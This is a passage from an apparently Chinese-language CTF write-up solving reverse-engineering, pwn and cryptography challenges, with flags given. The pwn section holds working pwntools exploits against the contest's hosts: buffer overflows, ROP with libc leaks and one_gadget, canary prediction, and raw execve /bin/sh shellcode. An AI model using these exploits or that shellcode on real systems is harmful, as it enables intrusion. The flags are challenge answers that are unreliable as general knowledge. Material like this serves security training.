17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]for i in range(24): v13[i] -= 10print(bytes(v13))# v13 = b&#x27;place inout your flag: \\n&#x27;for i in range(40): v10[i] -= 10print(bytes(v10))# v10 = b&#x27;yes! you are right!\\n\\x00&#x27;# v11 = b&#x27;no~try again~\\n\\x00&#x27;# v12 = b&#x27;no~\\x00&#x27;# len(s) == 32v7 = [k-10 for k in v16]print(bytes(v7))# v16 = v7 = b&#x27;do_you_konw_SYC?&#x27;# s[5] = 46# s[10] = 108# s[17] = 48v18 = [100, 111, 95, 121, 111, 117, 95, 107, 111, 110, 119, 95, 83, 89, 67, 63, 39, 199, 144, 207, 199, 232, 144, 20, 199, 241, 130, 144, 190, 146, 89, 74, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 57, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156]# ----------------------------------------# encrypt def ShiftRow(A): for i in range(0,16,4): for j in range(math.ceil(i/4)): A[i],A[i+1],A[i+2],A[i+3] = A[i+1],A[i+2],A[i+3],A[i] return Adef transform(A): tmp = [0]*16 for i in range(16): tmp[i] = A[i] x = 0 for j in range(4): for k in range(4): A[x] = tmp[4*k+j] A[x] = S[A[x]] x += 1 return As = list(b&#x27;abcde.ghijllmnopq0stuvwxyz123457&#x27;)v = [S[s[i]] for i in range(32)]v = ShiftRow(v[:16])+ShiftRow(v[16:])v = transform(v[:16])+transform(v[16:])for k in range(16): v[k] ^= v18[k] v[k+16] ^= v18[k]for k in range(32): v[k] = S[v[k]]v = ShiftRow(v[:16])+ShiftRow(v[16:])for k in range(16): v[k] ^= v18[16+k] v[k+16] ^= v18[16+k]print(v)# ----------------------------------------# decrypt S_inv = [S.index(k) for k in range(256)]def unShiftRow(A): for i in range(0,16,4): for j in range(math.ceil(i/4)): A[i],A[i+1],A[i+2],A[i+3] = A[i+3],A[i],A[i+1],A[i+2] return Adef untransform(A): A = [S_inv[A[k]] for k in range(16)] tmp = [0]*16 x = 0 for j in range(4): for k in range(4): tmp[4*k+j] = A[x] x += 1 return tmpy = c[:]for k in range(16): y[k] ^= v18[16+k] y[k+16] ^= v18[16+k]y = unShiftRow(y[:16])+unShiftRow(y[16:])for k in range(32): y[k] = S_inv[y[k]]for k in range(16): y[k] ^= v18[k] y[k+16] ^= v18[k] y = untransform(y[:16])+untransform(y[16:])y = unShiftRow(y[:16])+unShiftRow(y[16:])y = [S_inv[y[i]] for i in range(32)]print(bytes(y))# b&#x27;SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;&#x27; ​ ezandroid 喂！三点几啦！饮茶先啦！ (flag需要包上SYC{}提交) 在MainActivity中查看逻辑为： 1234567891011121314151617181920obj 补足24位 Xsb4 = sb2 = obj 偶数位sb5 = sb3 = obj 奇数位4位一组a|b|c|d -&gt; 整数key = [2023708229, -158607964, -2120859654, 1167043672]v0,v1,v2=m[0],m[1],m[2]for i in range(32): x+=0x9e3779b9 v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)m[0]=v0for i in range(32): x+=0x9e3779b9 v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3)m[1]=v2m[0]=v1 加密逻辑为魔改TEA： 1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Util.number import *def encrypt(v, k): v0,v1,v2 = v[0],v[1],v[2] x = 0 delta = 0x9E3779B9 k0,k1,k2,k3 = k[0],k[1],k[2],k[3] for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v2 = v2 &amp; 0xFFFFFFFF v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[1] = v2 v[2] = v1 return vm = b&#x27;abcdefghijkl&#x27;m = [bytes_to_long(m[4*i:4*(i+1)]) for i in range(len(m)//4)]print(m)key = [2023708229, -158607964, -2120859654, 1167043672]key = [k &amp; 0xffffffff for k in key]c = encrypt(m, key)print(c)cc = []for k in c: cc += list(long_to_bytes(k))print(cc)# bArr = bArr2 = cc = &#x27;a5f892c9cf4b730db48f6650&#x27;# ad@#E!@a123 = sb5# eCAS213@!@3 = bArr 带符号解密： 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; //解密函数void decrypt (int* v, int* k) &#123; int v0=v[0], v1=v[2],v2=v[1], sum=(-1640531527)*64, i; int delta=0x9e3779b9; int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i&lt;32; i++) &#123; v1 -= ((v2&lt;&lt;4) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;5) + k3); v2 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum += 1640531527; &#125; for (i=0; i&lt;32; i++) &#123; v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum += 1640531527; &#125; v[0]=v0; v[1]=v1; v[2]=v2;&#125; int main()&#123; int v[3]=&#123;2784531145, 3477828365, 3029296720&#125;; int k[4]=&#123;2023708229, -158607964, -2120859654, 1167043672&#125;; decrypt(&amp;v, k); printf(&quot;%x%x%x&quot;,v[0],v[1],v[2]); return 0;&#125;//543056743333546e30697472//T0Vt33Tn0itr 在MainActivity2中查看逻辑为： 12345678iArr=[-107, -106, -95, -115, -119, 127, 26, 121, -62, -20, 86, 9] = &#x27;9596a18d897f1a79c2ec5609&#x27;bytes = ad@#E!@a123 = sb5byteArrayExtra = eCAS213@!@3 = bArrbyteArrayExtra ^ bytes = iArr故 bytes = &#x27;0n3DF4itvc0Y&#x27; 合并得到flag：SYC&#123;T00nV3tD3F34Tint0vict0rY&#125; ​ 是男人就来扎针 简单的游戏逆向送分题,最终flag记得包裹上SYC{} ILSPY反编译，在 public class GameManager 找到代码逻辑。 1234567891011121314151617181920212223magicc = [75, 109, 102, 63, 107, 112, 63, 108, 124, 112, 109, 122, 63, 43, 47, 63, 111, 112, 118, 113, 107, 108, 62]magic = [124, 90, 81, 8, 92, 71, 8, 90, 77, 73, 75, 64, 8, 25, 24, 24, 8, 88, 71, 65, 70, 92, 91, 9]for i in range(30): magicc = [magicc[k] ^ (i+1) for k in range(len(magicc))]print(bytes(magicc))for i in range(40): magic = [magic[k] ^ (i+1) for k in range(len(magicc))]print(bytes(magic))import hashlibm = hashlib.md5(bytes(magicc)).hexdigest().upper()print(m)# CBDDD133B60130856D3C695D9E5ED6A5 flag：SYC&#123;CBDDD133B60130856D3C695D9E5ED6A5&#125; ​ PWNnc_pwntools12345678910111213from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,30348)r.recvuntil(b&#x27;!!!\\n&#x27;)r.send(b&#x27;a&#x27;*92+b&#x27;Syclover&#x27;)r.recvuntil(b&#x27;first one\\n&#x27;)exp=r.recvline().strip()[:-2]print(exp)r.sendline(str(eval(exp)).encode())r.interactive() ​ password概率性getshell。 123456789101112from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,30941)r.recvline()pl=b&#x27;a&#x27;*(0x20+8)+p64(0x4012F3)r.send(pl)r.recvline()r.sendline(b&#x27;\\x00&#x27;)r.interactive() ​ ret2text开了PIE，概率性getshell。 123456789from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31277)r.recvline()pl=b&#x27;a&#x27;*(0x50+8)+b&#x27;\\x27\\x12&#x27;r.send(pl)r.interactive() ​ write1按字节修改返回地址为后门函数 backdoor() 地址，修改2个字节即可。 123456789101112131415161718192021222324252627from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31467)r.sendline(b&#x27;abcdefghi&#x27;)# 0x40134d -&gt; 0x401225r.recvuntil(b&#x27;index:\\n&#x27;)# 0x68-0x40=40r.sendline(b&#x27;40&#x27;)r.recvuntil(b&#x27;value:&#x27;)# (0x25-0x4d)&amp;0xffffffff=0xffffffd8r.sendline(b&#x27;ffffffd8&#x27;)r.recvuntil(b&#x27;index:\\n&#x27;)# 0x68+1-0x40=41r.sendline(b&#x27;41&#x27;)r.recvuntil(b&#x27;value:&#x27;)# (0x12-0x13)&amp;0xffffffff=0xffffffffr.sendline(b&#x27;ffffffff&#x27;)r.recvuntil(b&#x27;index:\\n&#x27;)# exitr.sendline(b&#x27;-1&#x27;)r.interactive() ​ ret2libc（代码待补充） ​ ezpwn 先做这题，简单 （代码待补充） ​ write2栈地址泄露，栈可写，写24长度内的shellcode，while循环改写retaddr为栈地址，ret2shellcode。 1234567891011121314151617181920212223242526from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31581)context.arch=&#x27;amd64&#x27;r.recvuntil(b&#x27;addr:&#x27;)stack_leak=eval(r.recvline())print(hex(stack_leak))pl=b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&quot;print(len(pl))r.sendline(pl)shell_addr=stack_leak+4for i in range(6): r.recvuntil(b&#x27;index:\\n&#x27;) r.sendline(str(40+i).encode()) r.recvuntil(b&#x27;value:&#x27;) r.sendline(hex(shell_addr&gt;&gt;(8*i)&amp;0xff)[2:].encode()) r.recvuntil(b&#x27;index:\\n&#x27;)r.sendline(b&#x27;-1&#x27;)r.interactive() ​ fmt1.0（代码待补充） ​ white_canary 远程之前记得“sudo ntpdate cn.pool.ntp.org” 同步下时间 init() 自己实现了canary计算方法，禁用了59，无法 execve。 伪随机数算canary+写orw的shellcode+ret2shellcode。 123456789101112131415161718192021222324252627282930from pwn import *from ctypes import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31600)context.arch=&#x27;amd64&#x27;libc=cdll.LoadLibrary(&#x27;libc.so.6&#x27;)seed=libc.time(0)%60libc.srand(seed)v2 = libc.rand()v3 = libc.rand()canary = (((v2 &gt;&gt; 4) ^ (16 * v3 + (v3 &gt;&gt; 8) * (v2 &lt;&lt; 8))) &gt;&gt; 32) \\ + ((((v2 &gt;&gt; 48) + (v2 &lt;&lt; 16) * (v3 &gt;&gt; 16)) ^ (v3 &lt;&lt; 48)) &lt;&lt; 32) canary&amp;=0xffffffffffffffffprint(hex(canary))r.recvuntil(b&#x27;name:\\n&#x27;)someplace=0x404080pl=asm(shellcraft.open(&quot;./flag&quot;))pl+=asm(shellcraft.read(3, someplace, 0x20))pl+=asm(shellcraft.write(1, someplace, 0x20))r.send(pl)r.recvline()buf=0x4040E0pl=b&#x27;a&#x27;*(0x10-8)+p64(canary)+b&#x27;a&#x27;*8+p64(buf)r.sendline(pl)r.interactive() ​ ez_fullprotectionscanf泄露_start地址绕PIE，线程溢出TLS覆盖canary。 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,30161)elf=ELF(&#x27;./ez_fullprotection&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)r.recvline()r.recvline()r.sendline(b&#x27;x&#x27;)r.recvline()r.sendline(b&#x27;+&#x27;)r.recvuntil(b&#x27;entered &#x27;)_start=eval(r.recvuntil(b&#x27;.&#x27;)[:-1])base=_start - elf.sym._startprint(hex(base))puts_plt=base+elf.plt.putsputs_got=base+elf.got.putspop_rdi=base+0x16e3ret=base+0x101aret_addr=base+0x1541pl=b&#x27;a&#x27;*(0x30+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)pl=pl.ljust(0x870, b&#x27;a&#x27;)r.sendline(pl)puts_addr=u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:]+b&#x27;\\x00&#x27;*2)print(hex(puts_addr))libc_base=puts_addr-libc.sym.putsogg=[0xe3afe, 0xe3b01, 0xe3b04]ogg=[libc_base+k for k in ogg]pop_4=base+0x16dcpl=b&#x27;a&#x27;*(0x30+8)+p64(pop_4)+p64(0)*4+p64(ogg[0])r.sendline(pl)r.interactive() ​ CRYPTOSignIn Bibo…Hello! 你好! こんにちは! Привет! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d… Hmm… Something goes wrong with my grettings bot. 16进制转字符串：SYC&#123;Hello_World_Crypto_bibobibo&#125;。 ​ proof_of_work 题目链接：nc 59.110.20.54:5526 Build your own function to solve proof_of_work! PoW代码： 123456789101112131415161718192021from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&#x27;59.110.20.54&#x27;,5526)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(&#x27;XXXX+&#x27;) suffix = r.recv(16).decode(&#x27;utf8&#x27;) r.recvuntil(&#x27;== &#x27;) cipher = r.recvline().strip().decode(&#x27;utf8&#x27;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;XXXX: &#x27;, proof) PoW()r.interactive()# Congrats! Your flag is: SYC&#123;st3p_1nt0_1nter4ctive_Crypt0graphy&#125; ​ SimpleRSA So simple RSA! Wait… Are you kidding me? https://en.wikipedia.org/wiki/RSA_(cryptosystem) hint: flag&lt;p 123456789101112import gmpy2from Crypto.Util.number import * flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;assert len(flag) == 35p,q = [getPrime(2048) for _ in &quot;__&quot;] n = p*q e = 65537 c = gmpy2.powmod(bytes_to_long(flag),e,n) print(p) print(c)#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472 $d = e^{-1} \\bmod p,\\;\\;\\; m = c^d \\bmod p$。 12345678e = 65537p = 24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537c = 510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472d = inverse_mod(e,p-1)m = pow(c,d,p)print(bytes.fromhex(hex(m)[2:]))b&#x27;SYC&#123;Just_a_s1mple_modular_equation&#125;&#x27; ​ OTPTwice I invented a new symmetric cryptosystem, and I believe you will never break it! 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import xor from os import urandom flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot; # step0: key generation &amp; distributiondef s0(msg): k1,k2 = [urandom(len(msg)) for _ in &quot;__&quot;] return k1,k2 # # step1: Alice encrypt M, and send it to Bobdef s1(msg,k1): c1 = xor(msg,k1) return c1 # step2: Bob encrypt c1, and send it to Alice def s2(msg,k2): c2 = xor(msg,k2) return c2 # step3: Alice decrypt c2, and send it to Bob.def s3(msg,k1): c3 = xor(msg,k1) return c3 # step4: Bob decrypt c3, get M.def s4(msg,k2): m_ = xor(msg,k2) return m_ def encrypt(msg,k1,k2): c1 = s1(msg,k1) c2 = s2(c1,k2) c3 = s3(c2,k1) m_ = s4(c3,k2) assert msg == m_# Here&#x27;s what hacker Eve got:def encrypt_(msg,k1,k2): c1 = s1(msg,k1) c2 = s2(c1,k2) c3 = s3(c2,k1) m_ = s4(c3,k2) if HACK == True: print(c1) print(c2) print(c3) k1,k2 = s0(flag) encrypt_(flag,k1,k2) &#x27;&#x27;&#x27;b&#x27;\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9&#x27;b&#x27;o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR&#x27;b&#x27;\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96&#x27;&#x27;&#x27;&#x27; 推导有 $m = c_1 \\oplus c_2 \\oplus c_3$。 12345678910from Crypto.Util.strxor import strxorc1 = b&#x27;\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9&#x27;c2 = b&#x27;o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR&#x27;c3 = b&#x27;\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96&#x27;m = strxor(strxor(c1,c2),c3)print(m)# b&#x27;SYC&#123;I_l0v3_Crypt0&#125;&#x27; ​ OldAlgorithm An old algorithm but widely used nowadays. 12345678910111213141516171819from Crypto.Util.number import * import os flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;pad = lambda msg,padlen: msg+os.urandom(padlen-len(msg))flag = pad(flag,32)print(len(flag))p = [getPrime(16) for _ in range(32)] c = [bytes_to_long(flag)%i for i in p] print(&#x27;p=&#x27;,p)print(&#x27;c=&#x27;,c)&#x27;&#x27;&#x27;p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]&#x27;&#x27;&#x27; CRT算法。 123456p = [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]c = [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]m = crt(c,p)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\\x9c\\xf9C/\\xfc\\xb8t\\x16&#x27; ​ easy_classic 非常好套娃，使我的古典旋转 每一层解出的字符串为下一层zip压缩包密码。 第1层：udzeojxuwqcu，ROT10，得：enjoythegame 第2层：ialhhooavtepcyr，栅栏7，得：ilovecryptohaha 第3层：5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0，base64，得：宇宙万法的那个源头 第4层：熊曰：呋食食食取噗山笨笨破嗄咯哈動嗡雜類嗒嘿啽沒歡破吖咬我啽寶盜噔咯沒，熊曰解密，得：never gonna give you up 第5层：password: adltlfltqrcy，key: 👝👘👠👩👞👘👤👜， 先base100，得：key=fairgame，再playfair，得：genshinstart flag：SYC&#123;classical_1s_fun&#125; ​ PolyRSA Harder RSA. Check it out! 1234567891011121314151617181920212223import gmpy2from Crypto.Util.number import * flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;p,q = [getPrime(2048) for _ in &quot;__&quot;] e1,e2 = [getPrime(17) for _ in &quot;__&quot;] e = 65537n = p*q c1 = gmpy2.powmod(2*p + 3*q,e1,n)c2 = gmpy2.powmod(5*p + 7*q,e2,n) c = gmpy2.powmod(bytes_to_long(flag),e,n) print(&quot;e1=&quot;,e1)print(&quot;e2=&quot;,e2) print(&quot;c1=&quot;,c1) print(&quot;c2=&quot;,c2) print(&quot;c=&quot;,c)print(&quot;n=&quot;,n)#e1= 113717#e2= 80737#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089 参考GKCTF 2021 - RRRRsa相关推导，消元求gcd得 $p$。 123456789101112131415161718e1= 113717e2= 80737e = 65537c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356n= 